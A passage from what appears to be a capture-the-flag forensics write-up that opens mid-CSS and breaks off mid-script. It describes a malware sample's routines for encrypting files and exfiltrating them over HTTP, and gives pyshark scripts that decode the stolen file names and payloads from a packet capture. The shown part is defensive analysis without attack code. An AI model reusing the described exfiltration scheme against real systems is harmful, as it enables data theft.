1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>The \u003Ccode>EncryptFiles\u003C/code> and \u003Ccode>ExfiltrateFiles\u003C/code> processes, in short, encrypt all files in a folder (file exclusions are defined within the functions) using AES encryption with the key \u003Ccode>$masterEncryptionKey\u003C/code> and then encrypt the data again using \u003Ccode>R64Encoder\u003C/code>\u003C/p>\n\u003Cp>Looking at the HTTP stream we could see the process too.\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-08_01-47.png)\u003C/p>\n\u003Cp>After decoding the file names, we can determine where to start: at \u003Ccode>/files/j5WZuQHe05-Mx81ZhxmZ\u003C/code> since it’s \u003Ccode>flag_1.txt\u003C/code>.\u003C/p>\n\u003Cp>With a little help from good old ChatGPT :> I could use this script to extract the \u003Ccode>file's name : data\u003C/code> to \u003Ccode>output.txt\u003C/code>\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> pyshark\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">cap \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> pyshark.FileCapture(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'traffic.pcapng'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">display_filter\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'http.request.method == POST'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">post_data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> []\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">for\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> cap:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> hasattr\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(packet, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'http'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        url \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet.http.request_uri.split(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'/'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        payload \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet.http.file_data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 'file_data'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet.http.field_names \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">else\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        post_data.append(\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">f\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">{\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">url\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">}\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> : \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">{\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">payload\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">}\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">with\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> open\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"output.txt\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"w\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">as\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> f:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    for\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> entry \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> post_data:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        f.write(\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">f\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">{\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">entry\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">}\\n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"import pyshark\n\ncap = pyshark.FileCapture(&#x27;traffic.pcapng&#x27;, display_filter=&#x27;http.request.method == POST&#x27;)\n\npost_data = []\n\nfor packet in cap:\n    if hasattr(packet, &#x27;http&#x27;):\n        url = packet.http.request_uri.split(&#x27;/&#x27;)[-1] \n        payload = packet.http.file_data if &#x27;file_data&#x27; in packet.http.field_names else &#x22;&#x22;\n        post_data.append(f&#x22;{url} : {payload}&#x22;)\n\nwith open(&#x22;output.txt&#x22;, &#x22;w&#x22;) as f:\n    for entry in post_data:\n        f.write(f&#x22;{entry}\\n&#x22;)\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>But why not decrypt it on the go, let fix the script\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> binascii\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> re\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> pyshark\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">def\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> reverse_decode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(strings):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    reversed_strings \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> strings[::\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    replaced_strings \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> reversed_strings.replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"-\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"C\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"_\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"E\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    padding \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> len\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(replaced_strings) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">%\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 4\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> padding:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        replaced_strings \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"=\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> *\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">4\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> padding)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    try\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        decoded \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64.b64decode(replaced_strings)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">        return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decoded.decode(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'utf-8'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">errors\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'replace'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    except\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Exception\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> as\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> e:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">        print\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">f\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"Error decoding URL: \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">{\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">e\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">}\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">        return\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">cap \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> pyshark.FileCapture(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'traffic.pcapng'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">display_filter\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'http.request.method == POST'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">post_data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> []\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">for\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> cap:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> hasattr\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(packet, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'http'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        url_part \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet.http.request_uri.split(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'/'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        decoded_url \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> reverse_decode(url_part)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        hex_payload \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet.http.file_data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 'file_data'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> packet.http.field_names \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">else\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        ascii_payload \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">        if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> hex_payload:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">            try\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">                cleaned_hex \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> hex_payload.replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\":\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">                ascii_payload \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> binascii.unhexlify(cleaned_hex).decode(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'ascii'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">            except\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Exception\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> as\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> 